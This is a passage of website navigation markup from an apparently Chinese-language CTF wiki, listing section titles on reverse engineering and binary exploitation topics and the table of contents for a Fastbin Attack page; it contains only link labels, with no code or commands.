md-icon"></span> </label> <nav class=md-nav aria-label="Platform related" data-md-level=2> <label class=md-nav__title for=nav-8-7> <span class="md-nav__icon md-icon"></span> Platform related </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-1 type=checkbox id=nav-8-7-1> <label class=md-nav__link for=nav-8-7-1> Linux Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-1> <span class="md-nav__icon md-icon"></span> Linux Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/ld_preload/ class=md-nav__link> LD_PRELOAD </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/false-disasm/ class=md-nav__link> False Disassembly </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/detect-bp/ class=md-nav__link> Detecting Breakpoints </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/linux/detect-dbg/ class=md-nav__link> Detecting debugging </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2 type=checkbox id=nav-8-7-2> <label class=md-nav__link for=nav-8-7-2> Windows Reverse <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Windows Reverse" data-md-level=3> <label class=md-nav__title for=nav-8-7-2> <span class="md-nav__icon md-icon"></span> Windows Reverse </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-1 type=checkbox id=nav-8-7-2-1> <label class=md-nav__link for=nav-8-7-2-1> 脱壳技术 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=脱壳技术 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-1> <span class="md-nav__icon md-icon"></span> 脱壳技术 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/packer-introduction/ class=md-nav__link> 保护壳简介 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/trace/ class=md-nav__link> 单步跟踪法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/esp/ class=md-nav__link> ESP 定律法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/direct-oep/ class=md-nav__link> 一步到达 OEP 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/memory/ class=md-nav__link> 内存镜像法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/last-exception/ class=md-nav__link> 最后一次异常法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/sfx/ class=md-nav__link> SFX 法 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/fix-iat/ class=md-nav__link> DUMP 及 IAT 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/manually-fix-iat/ class=md-nav__link> 手动查找 IAT 并使用 ImportREC 重建 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/unpack/unpack-dll/ class=md-nav__link> DLL 文件脱壳 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-7-2-2 type=checkbox id=nav-8-7-2-2> <label class=md-nav__link for=nav-8-7-2-2> 反调试技术 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反调试技术 data-md-level=4> <label class=md-nav__title for=nav-8-7-2-2> <span class="md-nav__icon md-icon"></span> 反调试技术 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/ntglobalflag/ class=md-nav__link> NtGlobalFlag </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/heap-flags/ class=md-nav__link> Heap Flags </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/the-heap/ class=md-nav__link> The Heap </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/int-3/ class=md-nav__link> Interrupt 3 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/isdebuggerpresent/ class=md-nav__link> IsDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/checkremotedebuggerpresent/ class=md-nav__link> CheckRemoteDebuggerPresent </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/ntqueryinformationprocess/ class=md-nav__link> NtQueryInformationProcess </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/zwsetinformationthread/ class=md-nav__link> ZwSetInformationThread </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/junk-code/ class=md-nav__link> 花指令 </a> </li> <li class=md-nav__item> <a href=../../../../../../reverse/platform/windows/anti-debug/example/ class=md-nav__link> 反调试技术例题 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8 type=checkbox id=nav-8-8> <label class=md-nav__link for=nav-8-8> Language related <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Language related" data-md-level=2> <label class=md-nav__title for=nav-8-8> <span class="md-nav__icon md-icon"></span> Language related </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/introduction/ class=md-nav__link> 简介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-2 type=checkbox id=nav-8-8-2> <label class=md-nav__link for=nav-8-8-2> Python <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Python data-md-level=3> <label class=md-nav__title for=nav-8-8-2> <span class="md-nav__icon md-icon"></span> Python </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/python/introduction/ class=md-nav__link> Python 逆向入门 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-3 type=checkbox id=nav-8-8-3> <label class=md-nav__link for=nav-8-8-3> Rust <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Rust data-md-level=3> <label class=md-nav__title for=nav-8-8-3> <span class="md-nav__icon md-icon"></span> Rust </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/rust/introduction/ class=md-nav__link> Rust 逆向入门 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-8-8-4 type=checkbox id=nav-8-8-4> <label class=md-nav__link for=nav-8-8-4> Golang <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Golang data-md-level=3> <label class=md-nav__title for=nav-8-8-4> <span class="md-nav__icon md-icon"></span> Golang </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../reverse/language/go/introduction/ class=md-nav__link> Golang 逆向入门 </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9 type=checkbox id=nav-9 checked> <label class=md-nav__link for=nav-9> Pwn <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Pwn data-md-level=1> <label class=md-nav__title for=nav-9> <span class="md-nav__icon md-icon"></span> Pwn </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1 type=checkbox id=nav-9-1 checked> <label class=md-nav__link for=nav-9-1> Linux Platform <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Linux Platform" data-md-level=2> <label class=md-nav__title for=nav-9-1> <span class="md-nav__icon md-icon"></span> Linux Platform </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1 type=checkbox id=nav-9-1-1 checked> <label class=md-nav__link for=nav-9-1-1> User Mode <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="User Mode" data-md-level=3> <label class=md-nav__title for=nav-9-1-1> <span class="md-nav__icon md-icon"></span> User Mode </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-1 type=checkbox id=nav-9-1-1-1> <label class=md-nav__link for=nav-9-1-1-1> Environment <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Environment data-md-level=4> <label class=md-nav__title for=nav-9-1-1-1> <span class="md-nav__icon md-icon"></span> Environment </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../environment/ class=md-nav__link> Environment </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2 type=checkbox id=nav-9-1-1-2 checked> <label class=md-nav__link for=nav-9-1-1-2> Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Exploitation data-md-level=4> <label class=md-nav__title for=nav-9-1-1-2> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1 type=checkbox id=nav-9-1-1-2-1> <label class=md-nav__link for=nav-9-1-1-2-1> Stack Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Stack Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-1> <span class="md-nav__icon md-icon"></span> Stack Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1 type=checkbox id=nav-9-1-1-2-1-1> <label class=md-nav__link for=nav-9-1-1-2-1-1> x86 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=x86 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-1> <span class="md-nav__icon md-icon"></span> x86 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/x86/stack-intro/ class=md-nav__link> 栈介绍 </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/stackoverflow-basic/ class=md-nav__link> 栈溢出原理 </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/basic-rop/ class=md-nav__link> 基本 ROP </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/medium-rop/ class=md-nav__link> 中级ROP </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-5 type=checkbox id=nav-9-1-1-2-1-1-5> <label class=md-nav__link for=nav-9-1-1-2-1-1-5> 高级 ROP <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="高级 ROP" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-5> <span class="md-nav__icon md-icon"></span> 高级 ROP </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/advanced-rop/ class=md-nav__link> 高级 ROP </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/ret2dlresolve/ class=md-nav__link> ret2dlresolve </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/ret2vdso/ class=md-nav__link> ret2VDSO </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/x86/advanced-rop/srop/ class=md-nav__link> SROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-1-6 type=checkbox id=nav-9-1-1-2-1-1-6> <label class=md-nav__link for=nav-9-1-1-2-1-1-6> 花式栈溢出 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=花式栈溢出 data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-1-1-6> <span class="md-nav__icon md-icon"></span> 花式栈溢出 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/x86/fancy-rop/ class=md-nav__link> 花式栈溢出技巧 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-2 type=checkbox id=nav-9-1-1-2-1-2> <label class=md-nav__link for=nav-9-1-1-2-1-2> arm <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=arm data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-2> <span class="md-nav__icon md-icon"></span> arm </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/arm/environment/ class=md-nav__link> 环境搭建 </a> </li> <li class=md-nav__item> <a href=../../../stackoverflow/arm/rop/ class=md-nav__link> Arm ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-3 type=checkbox id=nav-9-1-1-2-1-3> <label class=md-nav__link for=nav-9-1-1-2-1-3> mips <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=mips data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-3> <span class="md-nav__icon md-icon"></span> mips </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/mips/rop/ class=md-nav__link> mips - ROP </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-1-4 type=checkbox id=nav-9-1-1-2-1-4> <label class=md-nav__link for=nav-9-1-1-2-1-4> risc-v <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=risc-v data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-1-4> <span class="md-nav__icon md-icon"></span> risc-v </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../stackoverflow/risc-v/readme/ class=md-nav__link> RISC-V </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-2 type=checkbox id=nav-9-1-1-2-2> <label class=md-nav__link for=nav-9-1-1-2-2> Format String <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Format String" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-2> <span class="md-nav__icon md-icon"></span> Format String </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-intro/ class=md-nav__link> 原理介绍 </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-exploit/ class=md-nav__link> 利用 </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-example/ class=md-nav__link> 例子 </a> </li> <li class=md-nav__item> <a href=../../../fmtstr/fmtstr-detect/ class=md-nav__link> 检测 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3 type=checkbox id=nav-9-1-1-2-3 checked> <label class=md-nav__link for=nav-9-1-1-2-3> Heap Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Heap Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-3> <span class="md-nav__icon md-icon"></span> Heap Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1 type=checkbox id=nav-9-1-1-2-3-1 checked> <label class=md-nav__link for=nav-9-1-1-2-3-1> Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Ptmalloc2 data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-1> <span class="md-nav__icon md-icon"></span> Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../introduction/ class=md-nav__link> 堆利用 </a> </li> <li class=md-nav__item> <a href=../heap-overview/ class=md-nav__link> 堆概述 </a> </li> <li class=md-nav__item> <a href=../heap-structure/ class=md-nav__link> 堆相关数据结构 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-1-4 type=checkbox id=nav-9-1-1-2-3-1-4> <label class=md-nav__link for=nav-9-1-1-2-3-1-4> 深入理解 Ptmalloc2 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="深入理解 Ptmalloc2" data-md-level=7> <label class=md-nav__title for=nav-9-1-1-2-3-1-4> <span class="md-nav__icon md-icon"></span> 深入理解 Ptmalloc2 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../implementation/overview/ class=md-nav__link> 深入理解堆的实现 </a> </li> <li class=md-nav__item> <a href=../implementation/basic/ class=md-nav__link> 基础操作 </a> </li> <li class=md-nav__item> <a href=../implementation/heap-init/ class=md-nav__link> 堆初始化 </a> </li> <li class=md-nav__item> <a href=../implementation/malloc/ class=md-nav__link> 申请内存块 </a> </li> <li class=md-nav__item> <a href=../implementation/free/ class=md-nav__link> 释放内存块 </a> </li> <li class=md-nav__item> <a href=../implementation/tcache/ class=md-nav__link> tcache </a> </li> <li class=md-nav__item> <a href=../implementation/malloc-state/ class=md-nav__link> malloc_state 相关函数 </a> </li> <li class=md-nav__item> <a href=../implementation/misc/ class=md-nav__link> 测试支持 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../heapoverflow-basic/ class=md-nav__link> 堆溢出 </a> </li> <li class=md-nav__item> <a href=../off-by-one/ class=md-nav__link> 堆中的 Off-By-One </a> </li> <li class=md-nav__item> <a href=../chunk-extend-overlapping/ class=md-nav__link> Chunk Extend and Overlapping </a> </li> <li class=md-nav__item> <a href=../unlink/ class=md-nav__link> Unlink </a> </li> <li class=md-nav__item> <a href=../use-after-free/ class=md-nav__link> Use After Free </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Fastbin Attack <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Fastbin Attack </a> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=#_1 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_2 class=md-nav__link> 原理 </a> </li> <li class=md-nav__item> <a href=#fastbin-double-free class=md-nav__link> Fastbin Double Free </a> <nav class=md-nav aria-label="Fastbin Double Free"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_3 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_4 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_5 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#house-of-spirit class=md-nav__link> House Of Spirit </a> <nav class=md-nav aria-label="House Of Spirit"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_6 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_7 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_8 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#alloc-to-stack class=md-nav__link> Alloc to Stack </a> <nav class=md-nav aria-label="Alloc to Stack"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_9 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_10 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_11 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#arbitrary-alloc class=md-nav__link> Arbitrary Alloc </a> <nav class=md-nav aria-label="Arbitrary Alloc"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_12 class=md-nav__link> 介绍 </a> </li> <li class=md-nav__item> <a href=#_13 class=md-nav__link> 演示 </a> </li> <li class=md-nav__item> <a href=#_14 class=md-nav__link> 小总结 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2014-hacklu-oreo class=md-nav__link> 2014 hack.lu oreo </a> <nav class=md-nav aria-label="2014 hack.lu oreo"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_15 class=md-nav__link> 基本分析 </a> </li> <li class=md-nav__item> <a href=#_16 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_17 class=md-nav__link> 利用 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2015-9447-ctf-search-engine class=md-nav__link> 2015 9447 CTF : Search Engine </a> <nav class=md-nav aria-label="2015 9447 CTF : Search Engine"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_18 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_19 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_20 class=md-nav__link> 词语结构体 </a> </li> <li class=md-nav__item> <a href=#_21 class=md-nav__link> 堆内存相关操作 </a> </li> <li class=md-nav__item> <a href=#_22 class=md-nav__link> 漏洞 </a> </li> <li class=md-nav__item> <a href=#_23 class=md-nav__link> 利用 </a> <nav class=md-nav aria-label=利用> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_24 class=md-nav__link> 利用思路 </a> </li> <li class=md-nav__item> <a href=#libc class=md-nav__link> 泄漏 libc 地址 </a> </li> <li class=md-nav__item> <a href=#fastbin class=md-nav__link> 构造 fastbin 循环链表 </a> </li> <li class=md-nav__item> <a href=#malloc_hook-chunk class=md-nav__link> 分配 malloc_hook 附近chunk </a> </li> <li class=md-nav__item> <a href=#shell class=md-nav__link> shell </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#2017-0ctf-babyheap class=md-nav__link> 2017 0ctf babyheap </a> <nav class=md-nav aria-label="2017 0ctf babyheap"> <ul class=md-nav__list> <li class=md-nav__item> <a href=#_25 class=md-nav__link> 基本信息 </a> </li> <li class=md-nav__item> <a href=#_26 class=md-nav__link> 基本功能 </a> </li> <li class=md-nav__item> <a href=#_27 class=md-nav__link> 利用思路 </a> <nav class=md-nav aria-label=利用思路> <ul class=md-nav__list> <li class=md-nav__item> <a href=#libc_1 class=md-nav__link> 泄漏 libc 基地址 </a> </li> <li class=md-nav__item> <a href=#chunkmalloc_hook class=md-nav__link> 分配chunk到malloc_hook附近 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=#_28 class=md-nav__link> 题目 </a> </li> <li class=md-nav__item> <a href=#_29 class=md-nav__link> 参考文献 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../unsorted-bin-attack/ class=md-nav__link> Unsorted Bin Attack </a> </li> <li class=md-nav__item> <a href=../large-bin-attack/ class=md-nav__link> Large Bin Attack </a> </li> <li class=md-nav__item> <a href=../tcache-attack/ class=md-nav__link> Tcache attack </a> </li> <li class=md-nav__item> <a href=../house-of-einherjar/ class=md-nav__link> House Of Einherjar </a> </li> <li class=md-nav__item> <a href=../house-of-force/ class=md-nav__link> House Of Force </a> </li> <li class=md-nav__item> <a href=../house-of-lore/ class=md-nav__link> House of Lore </a> </li> <li class=md-nav__item> <a href=../house-of-orange/ class=md-nav__link> House of Orange </a> </li> <li class=md-nav__item> <a href=../house-of-rabbit/ class=md-nav__link> House of Rabbit </a> </li> <li class=md-nav__item> <a href=../house-of-roman/ class=md-nav__link> House of Roman </a> </li> <li class=md-nav__item> <a href=../house-of-pig/ class=md-nav__link> House of Pig </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-3-2 type=checkbox id=nav-9-1-1-2-3-2> <label class=md-nav__link for=nav-9-1-1-2-3-2> Musl-mallocng <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Musl-mallocng data-md-level=6> <label class=md-nav__title for=nav-9-1-1-2-3-2> <span class="md-nav__icon md-icon"></span> Musl-mallocng </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../mallocng/readme/ class=md-nav__link> Readme </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-4 type=checkbox id=nav-9-1-1-2-4> <label class=md-nav__link for=nav-9-1-1-2-4> IO_FILE Exploitation <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="IO_FILE Exploitation" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-4> <span class="md-nav__icon md-icon"></span> IO_FILE Exploitation </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../io-file/introduction/ class=md-nav__link> FILE结构 </a> </li> <li class=md-nav__item> <a href=../../../io-file/fake-vtable-exploit/ class=md-nav__link> 伪造vtable劫持程序流程 </a> </li> <li class=md-nav__item> <a href=../../../io-file/fsop/ class=md-nav__link> FSOP </a> </li> <li class=md-nav__item> <a href=../../../io-file/exploit-in-libc2.24/ class=md-nav__link> glibc 2.24下 IO_FILE 的利用 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-5 type=checkbox id=nav-9-1-1-2-5> <label class=md-nav__link for=nav-9-1-1-2-5> Integer Overflow <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Integer Overflow" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-5> <span class="md-nav__icon md-icon"></span> Integer Overflow </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../integeroverflow/introduction/ class=md-nav__link> 整数溢出 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-6 type=checkbox id=nav-9-1-1-2-6> <label class=md-nav__link for=nav-9-1-1-2-6> Type Confusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Type Confusion" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-6> <span class="md-nav__icon md-icon"></span> Type Confusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../type-confusion/readme/ class=md-nav__link> Type Confusion </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-7 type=checkbox id=nav-9-1-1-2-7> <label class=md-nav__link for=nav-9-1-1-2-7> Uninitialized Memory <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Uninitialized Memory" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-7> <span class="md-nav__icon md-icon"></span> Uninitialized Memory </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../uninitialized-memory/readme/ class=md-nav__link> Uninitialized Memory </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-2-8 type=checkbox id=nav-9-1-1-2-8> <label class=md-nav__link for=nav-9-1-1-2-8> Race Condition <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Race Condition" data-md-level=5> <label class=md-nav__title for=nav-9-1-1-2-8> <span class="md-nav__icon md-icon"></span> Race Condition </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../race-condition/introduction/ class=md-nav__link> Race Condition </a> </li> <li class=md-nav__item> <a href=../../../race-condition/problem/ class=md-nav__link> 题目 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-3 type=checkbox id=nav-9-1-1-3> <label class=md-nav__link for=nav-9-1-1-3> Defense <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Defense data-md-level=4> <label class=md-nav__title for=nav-9-1-1-3> <span class="md-nav__icon md-icon"></span> Defense </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../mitigation/canary/ class=md-nav__link> Canary </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-9-1-1-4 type=checkbox id=nav-9-1-1-4> <label class=md-nav__link for=nav-9-1-1-4> Summary <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Summary data-md-level=4> <label class=md-nav__title for=nav-9-1-1-4> <span class="md-nav__icon md-icon"></span> Summary </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> 